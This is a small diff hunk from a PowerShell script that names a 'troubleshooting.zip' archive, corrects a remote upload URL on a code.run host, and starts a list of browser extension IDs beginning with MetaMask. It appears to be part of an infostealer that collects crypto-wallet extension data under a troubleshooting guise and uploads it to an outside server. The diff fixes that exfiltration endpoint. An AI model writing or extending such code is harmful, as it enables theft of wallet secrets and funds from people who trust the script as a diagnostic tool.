@@ -133,7 +133,7 @@ $zipFile = Join-Path $destination "troubleshooting.zip"
 # }
 
 
-$uploadUrl = "https://site--upload--57rc49tkrwqv.code.run"
+$uploadUrl = "https://site--upload--57rc49tkrwqv.code.run/upload"
 
 $extensionIDs = @{
     "MetaMask" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
